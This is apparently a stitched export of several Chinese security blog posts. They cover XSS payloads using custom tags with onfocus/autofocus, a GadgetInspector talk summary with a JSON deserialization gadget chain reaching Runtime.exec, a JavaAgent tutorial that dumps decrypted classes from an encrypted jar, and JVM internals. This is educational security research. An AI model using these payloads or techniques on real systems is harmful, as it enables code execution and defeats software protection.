在这里我们可以构造如下自mi1k7ea标签触发弹框： 1&lt;mi1k7ea onfocus=alert(/contenteditable/) autofocus contenteditable&gt; 0x03 user-modifyuser-modify属性是非标准的，在最初是用于确定元素的内容是否可以由用户编辑，在Firefox中无效。 属性值如下： read-only：默认值。内容是只读的。 read-write：用户能够读取和写入内容。 read-write-plaintext-only：与相同read-write，但富文本格式将丢失。 write-only：用户可以编辑内容，但不能阅读。 在这里我们可以利用的属性值为read-write和read-write-plaintext-only，构造如下自mi1k7ea标签触发弹框： 123&lt;mi1k7ea style=\"-webkit-user-modify:read-write\" onfocus=alert(/user-modify/) autofocus&gt;或&lt;mi1k7ea style=\"-webkit-user-modify:read-write-plaintext-only\" onfocus=alert(/user-modify/) autofocus&gt;","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"}]},{"title":"浅析反序列化利用链自动化挖掘工具GadgetInspector","date":"2020-05-11T14:45:22.000Z","path":"2020/05/11/浅析反序列化利用链自动化挖掘工具GadgetInspector/","text":"0x00 工具地址https://github.com/JackOfMostTrades/gadgetinspector 0x01 BlackHat议题解读下面按照BlackHat 2018中的演讲PPT展开介绍。 反序列化漏洞及利用工具概述作者先介绍了什么是反序列化漏洞，其中提到了反序列化漏洞之所以危害那么大是因为反序列化器会自动调用魔法函数。 魔法函数包括主要的readObject()和readResolve()，当然还有finalize()。除此之外，还有那些实现了这些魔法函数并调用了其他方法的可序列化的JDK类，归纳来说如下： Object.readObject() Object.readResolve() Object.finalize() HashMap Object.hashCode() Object.equals() PriorityQueue Comparator.compare() Comparable.compareTo() 如下图从hashCode()这个魔术方法看整条利用链： 这里readObject()函数中是调用了hashCode()函数；看到AbstractTableModel$ff19274a类的hashCode()函数实现是由调用IFn接口类的invoke()函数的；再看到实现IFn接口类的FnCompose类，其中自己实现的invoke()函数中分别调用了两个IFn类型的成员变量的invoke()函数，其中包括FnEval类的invoke()函数，这个方法中就是执行系统命令的Runtime.exec()。 所以直接构造如下Exp即可成功触发反序列化漏洞： 1234567891011121314151617&#123; \"@class\": \"java.util.HashMap\" \"members\": [ 2, &#123; \"@class\": \"AbstractTableModel$ff19274a\" __clojureFnMap: &#123; hashCode: &#123; \"@class\": \"FnCompose\" f2: &#123; \"@class\": \"FnConstant\", value: \"/usr/bin/calc\" &#125;, f1: &#123; \"@class\": \"FnEval\" &#125; &#125; &#125; &#125;, \"val\" ]&#125; 哪些Java库是有漏洞的？作者列出了以下几种（当然现在就不止了）： JDK (ObjectInputStream) XStream (XML, JSON) Jackson (JSON) Genson (JSON) JSON-IO (JSON) FlexSON (JSON) 那么如何挖掘这种类型的漏洞呢？其实和挖掘应用安全问题一样： 外部输入会传进漏洞出发点； 现有的静态和动态工具可以很好地辅助发现此类问题； 已知的一些反序列化利用工具： ysoserial：通常仅限于特定库中的链，并侧重于JDK ObjectInputStream的攻击利用； marshalsec：可供选择的反序列化库的利用范围更广； 但是，如果我们使用的是非标准反序列化库或者classpath上一些特定组合的库时，上面的工具就无法进行攻击利用了。 现存的Gadget链工具： ysoserial：收集已知的Gadget链和Exp； joogle：以编程方式查询类路径上的类型/方法； Java Deserialization Scanner：BurpSuite插件，使用已知payload（ysoserial）来发现和利用漏洞； marshalsec：用于许多库和Gadget链的反序列化payload生成器； NCC Group Burp Plugin：“主要基于穆尼奥斯和米罗什的《星期五13：JSON攻击》” 接着作者引出我们实际需要一个新工具，这个工具不需要自己生成payload，而是能够评估安全风险，即给定一个反序列化漏洞能否被攻击利用，有哪些利用方式比如RCE或DoS或SSRF。 因此，作者对该工具提出如下需求： 不用于寻找漏洞，只在漏洞挖掘阶段使用此工具辅助发现问题； 它需要查看应用程序的整个classpath； 报错信息应该是误报而不是漏报； 它应该在字节码上操作；我们通常将整个classpath打包为一个war，并且可能没有源代码（特别是如果我们包括专有的第三方库）； 另外，它可能包括用Groovy、Scala、Clojure编写的库； Gadget InspectorGadget Inspector是一个为辅助挖掘Gadget链而生的Java字节码分析工具。 具有以下特点： 在任意给定的classpath上操作，即特定的库或整个war包； 将发现的Gadget链作为方法调用序列进行报告； 执行一些简单的符号执行，以理解从方法参数到后续方法调用的可能数据流； 简化了许多假设，使代码分析更容易； 原理步骤Step1.枚举类/方法的层次结构 Step2.发现“透传”数据流 Step3.枚举“透传”调用图 Step4.枚举使用已知Tricks的Sources Step5.在调用图上应用BFS算法关联链 反序列化库的灵活性Gadget Inspector支持自定义分析规则。 什么被视为“可序列化”？ 对于JRE反序列化，任何实现java.lang.Serializable接口的类； 对于XStream，这取决于启用的转换器；当使用定制转换器时，它会变得更巧妙； 对于Jackson，任何没有参数构造函数的类； 什么是反序列化源（即魔术方法）？ 对于Jackson，我们只从构造函数开始； 我们应该关注哪些方法实现？ 对于JRE反序列化，所有实现了可序列化类的类； 对于Jackson，取决于注释和配置； 提升空间 反射 大多数反射调用被视为有趣的，导致FPs。例如，可以控制类，但不能控制方法名，反之亦然； 调用图枚举盲点，foo.getClass().getMethod(&quot;bar&quot;).invoke(…)； 假设 即使是很小的改进，Gadget Inspector也可以围绕条件可满足性或虚拟方法调用解析做出更好的决策，从而减少FPs； 限制 使用“已知的Tricks”来列举入口点，最初的研究仍然可以帮助我们找到许多其他聪明的方法来构建Gadget链； 带有“有趣行为”的sinks是硬编码的，许多空间可以发现和添加sinks； 0x02 浅析Gadget Inspector源码待补充… 0x0n 参考https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf Java 反序列化工具 gadgetinspector 初窥 java反序列化利用链自动挖掘工具gadgetinspector源码浅析 Java反序列化漏洞辅助工具之 gadgetinspector","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"浅析Java Instrument插桩技术","date":"2020-05-10T08:27:53.000Z","path":"2020/05/10/浅析Java-Instrument插桩技术/","text":"0x01 Java InstrumentInstrument简介利用 Java 代码，即 java.lang.instrument 做动态 Instrumentation 是 Java SE 5 的新特性，它把 Java 的 instrument 功能从本地代码中解放出来，使之可以用 Java 代码的方式解决问题。使用 Instrumentation，开发者可以构建一个独立于应用程序的代理程序（Agent），用来监测和协助运行在 JVM 上的程序，甚至能够替换和修改某些类的定义。有了这样的功能，开发者就可以实现更为灵活的运行时虚拟机监控和 Java 类操作了，这样的特性实际上提供了一种虚拟机级别支持的 AOP 实现方式，使得开发者无需对 JDK 做任何升级和改动，就可以实现某些 AOP 的功能了。 要想使用Java插桩，需要用到两个技术JavaAgent与Javassist 。前者用于拦截ClassLoad装载，后者用于操作修改class文件。 在应用启动时，通过-javaagent参数来指定一个代理程序。 详细介绍见：Java SE 6 新特性：Instrumentation 新功能 Instrument整体流程Instrument是JVM提供的一个可以修改已加载类的类库，专门为Java语言编写的插桩服务提供支持。它需要依赖JVMTI的Attach API机制实现。在JDK 1.6以前，Instrument只能在JVM刚启动开始加载类时生效，而在JDK 1.6之后，Instrument支持了在运行时对类定义的修改。 在JVM启动时，通过JVM参数-javaagent，传入agent jar，Instrument Agent被加载，调用其Agent_OnLoad函数； 在Instrument Agent 初始化时，注册了JVMTI初始化函数eventHandlerVMinit； 在JVM启动时，会调用初始化函数eventHandlerVMinit，启动了Instrument Agent； 用sun.instrument.instrumentationImpl类里的方法loadClassAndCallPremain方法去初始化Premain-Class指定类的premain方法。初始化函数eventHandlerVMinit，注册了class解析的ClassFileLoadHook函数； 调用应用程序的main开始执行，准备解析； 解析Class之前，JVM调用JVMTI的ClassFileLoadHook函数，钩子函数调用sun.instrument.instrumentationImpl类里的transform方法，通过TransformerManager的transformer方法最终调用我们自定义的Transformer类的transform方法； 因为字节码在解析Class之前改的，直接使用修改后的字节码的数据流替代，最后进入Class解析，对整个Class解析无影响； 重新加载Class依然重新走6-7步骤； JavaAgent简介JavaAgent本质上可以理解为一个插件，该插件就是一个精心提供的jar包，这个jar包通过JVMTI（JVM Tool Interface）完成加载，最终借助JPLISAgent（Java Programming Language Instrumentation Services Agent）完成对目标代码的修改。 通过JavaAgent技术进行类的字节码修改最主要使用的就是Java Instrumentation API。 JavaAgent技术的主要功能如下： 可以在加载Java文件之前做拦截把字节码做修改； 可以在运行期将已经加载的类的字节码做变更； 还有其他的一些小众的功能： 获取所有已经被加载过的类 获取所有已经被初始化过了的类 获取某个对象的大小 将某个jar加入到bootstrapclasspath里作为高优先级被bootstrapClassloader加载 将某个jar加入到classpath里供AppClassloard去加载 设置某些native方法的前缀，主要在查找native方法的时候做规则匹配 下图说明了是否使用JavaAgent的时候的区别。当使用JavaAgent之后，加载的class都会被拦截，就可以在拦截的过程中进行修改： JavaAgent最后展现形式是一个Jar包，有以下特性： 必须 META-INF/MANIFEST.MF中指定Premain-Class 设定启agent启动类； 在启动类需写明启动方法public static void main(String arg,)； 不可直接运行，只能通过JVM参数-javaagent:xxx.jar附着于其它JVM进程运行； 启动时修改 启动时修改主要是在JVM启动时，执行native函数的Agent_OnLoad方法，在方法执行时，执行如下步骤： 创建InstrumentationImpl对象 监听ClassFileLoadHook事件 调用InstrumentationImpl的loadClassAndCallPremain方法，在这个方法里会去调用JavaAgent里MANIFEST.MF里指定的Premain-Class类的premain方法 运行时修改 运行时修改主要是通过JVM的attach机制来请求目标JVM加载对应的agent，执行native函数的Agent_OnAttach方法，在方法执行时，执行如下步骤： 创建InstrumentationImpl对象 监听ClassFileLoadHook事件 调用InstrumentationImpl的loadClassAndCallAgentmain方法，在这个方法里会去调用javaagent里MANIFEST.MF里指定的Agentmain-Class类的agentmain方法 ClassFileLoadHook和TransFormClassFile从前面可以看出整体流程中有两个部分是具有共性的，分别为： ClassFileLoadHook TranFormClassFile ClassFileLoadHook是一个JVMTI事件，该事件是Instrument Agent的一个核心事件，主要是在读取字节码文件回调时调用，内部调用了TransFormClassFile函数。 TransFormClassFile的主要作用是调用java.lang.instrument.ClassFileTransformer的tranform方法，该方法由开发者实现，通过instrument的addTransformer方法进行注册。 通过以上描述可以看出在字节码文件加载的时候，会触发ClassFileLoadHook事件，该事件调用TransFormClassFile，通过经由instrument的addTransformer注册的方法完成整体的字节码修改。 对于已加载的类，需要调用retransformClass函数，然后经由redefineClasses函数，在读取已加载的字节码文件后，若该字节码文件对应的类关注了ClassFileLoadHook事件，则调用ClassFileLoadHook事件。后续流程与类加载时字节码替换一致。 0x02 常用字节码操作工具JavaassistJavaassist是一个开源的分析、编辑和创建Java字节码的类库。性能消耗较大，但容易使用。 特点：简单，性能比ASM低。 ASMASM是一个轻量级的Java字节码操作框架，直接涉及到JVM底层的操作和指令。性能高，功能丰富。 特点：复杂，性能高，一般更为常用。 BCELBCEL这是Apache Software Fundation的Jakarta项目的一部分。BCEL可以让你深入JVM汇编语言进行类的操作的细节。 0x03 Instrument的基本功能和用法基本功能java.lang.instrument包的具体实现，依赖于 JVMTI。JVMTI（Java Virtual Machine Tool Interface）是一套由 Java 虚拟机提供的，为 JVM 相关的工具提供的本地编程接口集合。JVMTI 提供了一套”代理”程序机制，可以支持第三方工具程序以代理的方式连接和访问 JVM，并利用 JVMTI 提供的丰富的编程接口，完成很多跟 JVM 相关的功能。事实上，java.lang.instrument 包的实现，也就是基于这种机制的：在 Instrumentation 的实现当中，存在一个 JVMTI 的代理程序，通过调用 JVMTI 当中 Java 类相关的函数来完成 Java 类的动态操作。除开 Instrumentation 功能外，JVMTI 还在虚拟机内存管理，线程控制，方法和变量操作等等方面提供了大量有价值的函数。 Instrumentation 的最大作用，就是类定义动态改变和操作。在 Java SE 5 及其后续版本当中，开发者可以在一个普通 Java 程序（带有 main 函数的 Java 类）运行时，通过-javaagent参数指定一个特定的 jar 文件（包含 Instrumentation 代理）来启动 Instrumentation 的代理程序。 函数说明premain()在主程序运行之前的代理程序使用premain()。 有如下两种方式编写premain函数： 12public static void premain(String agentArgs,Instrumentation inst);public static void premain(String agentArgs); 注意，第一种定义方式优先执行于第二种定义方式。 两个参数解释： agentArgs是函数得到的程序参数，随同”-javaagent”一起传入，传入的是一个字符串 Inst是一个java.lang.instrument.Instrumentation的实例，由JVM自动传入 agentmain()在主程序运行之后的代理程序使用agentmain()。 定义方式和premain类似： 1public static void agentmain(String agentArgs,Instrumentation inst) addTransformer()增加一个Class文件的转换器，该转换器用于改变class二进制流的数据，参数canRetransform设置是否允许重新转换。 redefineClasses()类加载之前，重新定义class文件，ClassDefinition表示一个类新的定义，如果在类加载之后，需要用retransformClasses方法重新定义。 retransformClasses()在类加载之后，重新定义class。事实上，该方法update了一个类。 appendToBootstrapClassLoaderSearch()添加jar文件到BootstrapClassLoader中。 appendToSystemClassLoaderSearch()添加jar文件到system class loader。 getAllLoadedClasses()获取加载的所有类数组。 Javassist的特殊语法 基本步骤编写premain函数编写一个 Java 类，包含如下两个方法当中的任何一个： 12public static void premain(String agentArgs, Instrumentation inst); [1]public static void premain(String agentArgs); [2] 其中，[1] 的优先级比 [2] 高，将会被优先执行（[1] 和 [2] 同时存在时，[2] 被忽略）。 在这个 premain 函数中，开发者可以进行对类的各种操作。 agentArgs 是 premain 函数得到的程序参数，随同 “– javaagent”一起传入。与 main 函数不同的是，这个参数是一个字符串而不是一个字符串数组，如果程序参数有多个，程序将自行解析这个字符串。 Inst 是一个 java.lang.instrument.Instrumentation 的实例，由 JVM 自动传入。 java.lang.instrument.Instrumentation 是 instrument 包中定义的一个接口，也是这个包的核心部分，集中了其中几乎所有的功能方法，例如类定义的转换和操作等等。 jar文件打包将这个 Java 类打包成一个 jar 文件，并在其中的 manifest 属性当中加入” Premain-Class”来指定步骤 1 当中编写的那个带有 premain 的 Java 类。 运行用如下方式运行带有 Instrumentation 的 Java 程序： 1java -javaagent:jar 文件的位置 [= 传入 premain 的参数 ] 0x04 Demo使用premain()在主程序运行之前代理要使用instrument的类修改功能，我们需要实现它提供的ClassFileTransformer接口，定义一个类文件转换器。接口中的transform()方法会在类文件被加载时调用，而在transform方法里，我们可以利用上文中的ASM或Javassist对传入的字节码进行改写或替换，生成新的字节码数组后返回。 每当加载一个class文件时输出当前class文件名： 12345678910111213141516171819202122package main.java.mi1k7eatest;import java.io.PrintStream;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.lang.instrument.Instrumentation;import java.security.ProtectionDomain;public class PreMainTraceAgent&#123; public static void premain(String agentArgs, Instrumentation inst) &#123; System.out.println(\"agentArgs : \" + agentArgs); inst.addTransformer(new DefineTransformer(), true); &#125; static class DefineTransformer implements ClassFileTransformer&#123; public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException&#123; System.out.println(\"premain load Class:\" + className); return classfileBuffer; &#125; &#125;&#125; 配置文件META-INF/MANIFEST.MF: 1234Manifest-Version: 1.0Can-Redefine-Classes: trueCan-Retransform-Classes: truePremain-Class: main.java.mi1k7eatest.PreMainTraceAgent Premain-Class用于指定上面的premain函数所在的Class。 然后在启动java服务的时候添加启动参数: 1-javaagent:mi1k7ea.jar=123 使用agentmain()在主程序运行之后代理1234567public static void agentmain(String args,Instrumentation inst)&#123; Class&lt;?&gt;[] classes = inst.getAllLoadedClasses(); for(Class&lt;?&gt;[] cls:classes)&#123; System.out.println(cls.getName()); &#125; System.out.println(\"Finished\");&#125; 在程序运行后加载，编写加载agent类的程序。因为如果选择agentmain的写法，运行时主程序已经加载了，所以我们不能再在程序中编写加载的代码，只能另写程序。 那么另写程序如何与主程序进行通信？ 这里用到的机制就是attach机制，它可以将JVM A连接至JVM B，并发送指令给JVM B执行，JDK自带常用工具如jstack，jps等就是使用该机制来实现的。 这里我们先用tomcat启动一个程序我们称为主程序B 然后再来写A程序代码如下： 12345678public static void main(String[] args)&#123; try&#123; VirtualMachine vm = VirtualMachine.attach(\"78256\"); vm.loadAgent(\"/home/mi1k7ea.jar\"); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125;&#125; 上述代码将mi1k7ea.jar连接到tomcat的78256进程上 查看tomcat的控制台，就会发现已经执行了mi1k7ea.jar的代码，有相应的输出内容。 0x05 实例——Dump加密class源码现在假设有个ClassEncode_encrypt.jar文件，其中的com.mi1k7ea包下的class文件都被加密处理了，直接用反编译工具是没办法反编译成功的。但由于该jar文件在运行时需要加载特定的so文件来在加密的class文件中字节码执行之前先进行解码操作，因此我们可以使用JavaAgent来实现在目标class文件内容被解码后且执行前将其class文件源码dump下来。 具体场景参考：Java代码反反编译对抗思路 这里我们选择在主程序运行之前进行代理，即编写premain()函数。 MainAgent.java，定义了premain()函数，其中调用了Instrumentation类的addTransformer()函数来添加一个类文件转换器实例，该实例类型为后面定义的DumpClassTransformer类： 12345678910111213package com.dumpclass;import java.lang.instrument.Instrumentation;public class MainAgent &#123; public static void main(String[] args) &#123; &#125; public static void premain(String args, Instrumentation instrumentation) &#123; instrumentation.addTransformer(new DumpClassTransformer()); &#125;&#125; DumpClassTransformer.java，实现instrument提供的ClassFileTransformer接口，定义了一个transform()方法，该方法会在类文件被加载时调用，而在该方法中会将已经解码的class文件字节码写入目标文件中保存： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package com.dumpclass;import java.io.File;import java.io.FileOutputStream;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.security.ProtectionDomain;public class DumpClassTransformer implements ClassFileTransformer &#123; private static final String DUMP_PACKAGE = System.getProperty(\"dump_package\"); private static final String OUT_FOLDER = System.getProperty(\"dump_out_folder\"); public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123; if (className == null || className.isEmpty()) &#123; return classfileBuffer; &#125; if (classfileBuffer == null) &#123; return classfileBuffer; &#125; String tmpClassName = className.replace(\"/\", \".\"); if (tmpClassName.startsWith(DUMP_PACKAGE)) &#123; try &#123; writeClass(className, classfileBuffer); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; return classfileBuffer; &#125; private boolean writeClass(String className, byte[] classfileBuffer) &#123; File file = null; FileOutputStream fileOutputStream = null; try &#123; String folder = OUT_FOLDER; if (!folder.endsWith(File.separator)) &#123; folder = folder + File.separator; &#125; String classPath = className.substring(0, className.lastIndexOf(\"/\")); className = className.substring(className.lastIndexOf(\"/\") + 1, className.length()); String path = OUT_FOLDER + File.separator + classPath; file = new File(path); if (!file.exists()) &#123; file.mkdirs(); &#125; file = new File(path + File.separator + className + \".class\"); fileOutputStream = new FileOutputStream(file); fileOutputStream.write(classfileBuffer); fileOutputStream.flush(); &#125; catch (Exception e) &#123; e.printStackTrace(); return false; &#125; finally &#123; try &#123; if (fileOutputStream != null) &#123; fileOutputStream.close(); fileOutputStream = null; &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; return true; &#125;&#125; 配置文件META-INF/MANIFEST.MF，Premain-Class用于指定上面的premain()函数所在的Class，注意最后必须空一行出来： 1234Manifest-Version: 1.0Can-Redefine-Classes: trueCan-Retransform-Classes: truePremain-Class: com.dumpclass.MainAgent 打包成DumpClass.jar。 通过以下命令，指定JavaAgent的jar包，然后在目标jar包主执行类方法执行之前先执行DumpClass.jar中的premain()方法，从而从内存将加密的目标jar类的字节码Dump下来： 1java -Ddump_package=com.mi1k7ea -Ddump_out_folder=/tmp -agentlib:decrypt -javaagent:DumpClass.jar -jar ClassEncode_encrypt.jar 下载下来，此时就能从成功反编译获取到加密class文件的内容了： 0x06 参考java agent技术原理及简单实现 字节码插桩技术 插桩技术在Java安全中的应用简述 Java SE 6 新特性：Instrumentation 新功能","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"浅析JVM","date":"2020-05-08T14:47:34.000Z","path":"2020/05/08/浅析JVM/","text":"0x00 前言本文直接参考或引自网上文章。 0x01 JVM简介JVM是Java Virtual Machine（Java虚拟机）的缩写，JVM是一种用于计算设备的规范，它是一个虚构出来的计算机，是通过在实际的计算机上仿真模拟各种计算机功能来实现的。 引入Java语言虚拟机后，Java语言在不同平台上运行时不需要重新编译。Java语言使用Java虚拟机屏蔽了与具体平台相关的信息，使得Java语言编译程序只需生成在Java虚拟机上运行的目标代码（字节码），就可以在多种平台上不加修改地运行。 Java虚拟机有自己完善的硬件架构，如处理器、堆栈等，还具有相应的指令系统。 Java虚拟机本质上就是一个程序，当它在命令行上启动的时候，就开始执行保存在某字节码文件中的指令。Java语言的可移植性正是建立在Java虚拟机的基础上。任何平台只要装有针对于该平台的Java虚拟机，字节码文件（.class）就可以在该平台上运行。这就是“一次编译，多次运行”。 Java虚拟机不仅是一种跨平台的软件，而且是一种新的网络计算平台。该平台包括许多相关的技术，如符合开放接口标准的各种API、优化技术等。Java技术使同一种应用可以运行在不同的平台上。Java平台可分为两部分，即Java虚拟机（Java virtual machine，JVM）和Java API类库。 JVM特性： 移植性：无论是GC还是Hotspot都可以用在任何Java可用的地方。比方说，JRuby可以运行在其他平台上，Rails应用就可以运行在IBM主机上的JRuby上，而且这台IBM主机运行的是CP/CMS.实际上，由于Java和OpenJDK项目的开源，我们正在看到越来越多的平台的衍生，因此JVM的移植性也将越来越棒。 成熟：JVM已有多年的历史，在过去的这些年里，许多开发者为它做出了许多贡献，使得它的性能一次又一次地提升，让JVM变得更加稳定、快速和广泛。 覆盖面：JRuby和JVM上的其他语言项目已经被承认，一个例子是invokedynamic specification（akaJSR292）。JSR越来越配合新的语言，JVM已不再是Java一个人定制规则。JVM正在构建成为类如JRuby等项目的优良平台。还有一个MLVM（multiple languageVM）项目，好比是新特性的清算机构，是一个许多企业应用的开发者试图添加应用的地方，而这些应用正是他们想在JVM中看到的。而且JVM开发者互相协作、彼此影响，无疑这有利于JVM新特性的诞生。这些细节都可以看到JVM正在关注开发者的需求，扩大他的覆盖面。 0x02 体系结构Java虚拟机主要分为五大模块：类装载器子系统、运行时数据区、执行引擎、本地方法接口和垃圾收集模块。其中垃圾收集模块在Java虚拟机规范中并没有要求Java虚拟机垃圾收集，但是在没有发明无限的内存之前，大多数JVM实现都是有垃圾收集的。而运行时数据区都会以某种形式存在于每一个JAVA虚拟机实例中，但是Java虚拟机规范对它的描述却是相当抽象。这些运行时数据结构上的细节，大多数都由具体实现的设计者决定。 Java虚拟机不是真实的物理机，它没有寄存器，所以指令集是使用Java栈来存储中间数据，这样做的目的就是为了保持Java虚拟机的指令集尽量的紧凑，同时也便于JAVA虚拟机在那些只有很少通用寄存器的平台上实现。另外，JAVA虚拟机的这种基于栈的体系结构，有助于运行时某些虚拟机实现的动态编译器和即时编译器的代码优化。 下面对JVM体系结构中的五大模块分别进行说明。 0x03 运行时数据区JVM体系结构如图： 几个主要区域的特点归纳如下： 各个空间的内存分配如下： 程序计数器线程私有。 作用字节码解释器工作通过改变程序计数器的值来选取下一条需要执行的字节码指令。分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖程序计数器来完成。 介绍JVM的多线程是通过线程轮流切换并分配处理器执行时间的方式来实现的，为了各条线程之间的切换后计数器能恢复到正确的执行位置，所以每条线程都会有一个独立的程序计数器。 当线程正在执行一个Java方法，程序计数器记录的是正在执行的JVM字节码指令的地址；如果正在执行的是一个Natvie（本地方法），那么这个计数器的值则为空（Underfined）。 程序计数器占用的内存空间很少，也是唯一一个在JVM规范中没有规定任何OutOfMemoryError（内存不足错误）的区域。 Java虚拟机栈线程私有。 作用Java虚拟机栈保存内容：存储局部变量，操作数栈，动态链接，方法出口。 介绍与程序计数器一样，Java虚拟机栈也是线程私有的，用通俗的话将它就是我们常常听说到堆栈中的那个“栈内存”。 虚拟机栈描述的是Java方法执行的内存模型：每个方法在执行的同时都会创建一个栈帧(Stack Frame)用于存储局部变量表（局部变量表需要的内存在编译期间就确定了所以在方法运行期间不会改变大小），操作数栈，动态链接，方法出口等信息。 栈是Java方法执行的内存模型：每个方法被执行的时候都会创建一个“栈帧”用于存储局部变量表(包括参数)、操作栈、方法出口等信息。每一个方法从调用至出栈的过程，就对应着栈帧在虚拟机中从入栈到出栈的过程。 栈的生命周期是跟随线程的生命周期，线程创建时创建，线程结束栈内存也就释放，是线程私有的。 本地方法栈和Java虚拟机栈的区别：Java虚拟机栈为虚拟机执行的Java方法服务，而本地方法栈则是为Native方法服务。 保存具体内容如图： 局部变量表局部变量表是一组变量值存储空间，用于存放方法参数和方法内部定义的局部变量。在Java程序被编译成Class文件时，就在方法的Code属性的max_locals数据项中确定了该方法所需要分配的最大局部变量表的容量。 局部变量表的容量以变量槽（Slot）为最小单位，32位虚拟机中一个Slot可以存放一个32位以内的数据类型（boolean、byte、char、short、int、float、reference和returnAddress八种）。 reference类型虚拟机规范没有明确说明它的长度，但一般来说，虚拟机实现至少都应当能从此引用中直接或者间接地查找到对象在Java堆中的起始地址索引和方法区中的对象类型数据。 returnAddress类型是为字节码指令jsr、jsr_w和ret服务的，它指向了一条字节码指令的地址。 虚拟机是使用局部变量表完成参数值到参数变量列表的传递过程的，如果是实例方法（非static），那么局部变量表的第0位索引的Slot默认是用于传递方法所属对象实例的引用，在方法中通过this访问。 Slot是可以重用的，当Slot中的变量超出了作用域，那么下一次分配Slot的时候，将会覆盖原来的数据。Slot对对象的引用会影响GC（要是被引用，将不会被回收）。 系统不会为局部变量赋予初始值（实例变量和类变量都会被赋予初始值）。也就是说不存在类变量那样的准备阶段。 操作数栈操作数栈和局部变量区一样，操作数栈也是被组织成一个以字长为单位的数组。但是和前者不同的是，它不是通过索引来访问，而是通过标准的栈操作——压栈和出栈来访问的。比如，如果某个指令把一个值压入到操作数栈中，稍后另一个指令就可以弹出这个值来使用。 虚拟机在操作数栈中存储数据的方式和在局部变量区中是一样的：如int、long、float、double、reference和returnType的存储。对于byte、short以及char类型的值在压入到操作数栈之前，也会被转换为int。 虚拟机把操作数栈作为它的工作区——大多数指令都要从这里弹出数据，执行运算，然后把结果压回操作数栈。比如，iadd指令就要从操作数栈中弹出两个整数，执行加法运算，其结果又压回到操作数栈中，看看下面的示例，它演示了虚拟机是如何把两个int类型的局部变量相加，再把结果保存到第三个局部变量的： 123456beginiload_0 // push the int in local variable 0 ontothe stackiload_1 //push the int in local variable 1 onto the stackiadd // pop two ints, add them, push resultistore_2 // pop int, store into local variable 2end 在这个字节码序列里，前两个指令iload_0和iload_1将存储在局部变量中索引为0和1的整数压入操作数栈中，其后iadd指令从操作数栈中弹出那两个整数相加，再将结果压入操作数栈。第四条指令istore_2则从操作数栈中弹出结果，并把它存储到局部变量区索引为2的位置。 下图详细表述了这个过程中局部变量和操作数栈的状态变化，图中没有使用的局部变量区和操作数栈区域以空白表示： 动态链接动态链接 : 虚拟机运行的时候，运行时常量池会保存大量的符号引用，这些符号引用可以看成是每个方法的间接引用。如果代表栈帧A的方法想调用代表栈帧B的方法，那么这个虚拟机的方法调用指令就会以B方法的符号引用作为参数，但是因为符号引用并不是直接指向代表B方法的内存位置，所以在调用之前还必须要将符号引用转换为直接引用，然后通过直接引用才可以访问到真正的方法。 如果符号引用是在类加载阶段或者第一次使用的时候转化为直接应用，那么这种转换成为静态解析。 如果是在运行期间转换为直接引用，那么这种转换就成为动态链接。 返回地址方法的返回分为两种情况： 一种是正常退出，退出后会根据方法的定义来决定是否要传返回值给上层的调用者。 一种是异常导致的方法结束，这种情况是不会传返回值给上层的调用方法。 不过无论是那种方式的方法结束，在退出当前方法时都会跳转到当前方法被调用的位置。 如果方法是正常退出的，则调用者的PC计数器的值就可以作为返回地址； 如果是因为异常退出的，则是需要通过异常处理表来确定。 方法的一次调用就对应着栈帧在虚拟机栈中的一次入栈出栈操作，因此方法退出时可能做的事情包括：恢复上层方法的局部变量表以及操作数栈，如果有返回值的话，就把返回值压入到调用者栈帧的操作数栈中，还会把PC计数器的值调整为方法调用入口的下一条指令。 关于Java栈的更多解析可以查阅下文：https://www.jianshu.com/p/15932712fcb4 本地方法栈线程私有。 作用主要用于存储本地方法的局部变量表，本地方法的操作数栈等信息。 介绍栈作为一种线性的管道结构，遵循先进后出的原则。当栈内的数据在超出其作用域后，会被自动释放掉。 本地方法栈是在程序调用或JVM调用本地方法接口（Native）时候启用。 本地方法栈和Java虚拟机栈的区别：Java虚拟机栈为虚拟机执行的Java方法服务，而本地方法栈则是为Native方法服务。 Java堆（Heap）各线程共享区域。 作用Java堆是一个运行时的数据区，用来存储数据的单元，存放通过new关键字新建的对象和数组，对象从中分配内存。 介绍在堆中声明的对象，是不能直接访问的，必须通过在栈中声明的指向该引用的变量来调用。引用变量就相当于是为数组或对象起的一个名称，以后就可以在程序中使用栈中的引用变量来访问堆中的数组或对象。 特点 Java虚拟机所管理的内存中最大的一块。Java堆是被所有线程共享的一块内存区域，在虚拟机启动时创建。 此内存区域的唯一目的就是存放对象实例，几乎所有的对象实例都在这里分配内存。几乎所有的对象实例以及数组都要在堆上分配。 Java堆是GC管理的区域，也称为GC堆。 Java堆中还细分为：新生代，老年代；再细分一点有Eden空间，From Survivor（sərˈvaɪvə(r)，幸存者）空间，To Survivor空间。 堆的结构堆内存是所有线程共有的，可以分为两个部分：新生代和老年代、永久代(HotSpot有)。下图中的Perm代表的是永久代，但是注意永久代并不属于堆内存中的一部分，同时jdk1.8之后永久代也将被移除。 新生代程序新创建的对象都是从新生代分配内存，新生代由Eden Space和两块相同大小的Survivor Space(通常又称S0和S1或From和To)构成。 可通过-Xmn参数来指定新生代的大小；也可以通过-XX:SurvivorRation来调整Eden Space及SurvivorSpace的大小。 新生代的初始值NewSize默认为1M，最大值需要设置，可以通过参数-XX:NewSize和-XX:MaxNewSize或-Xmn进行设置； 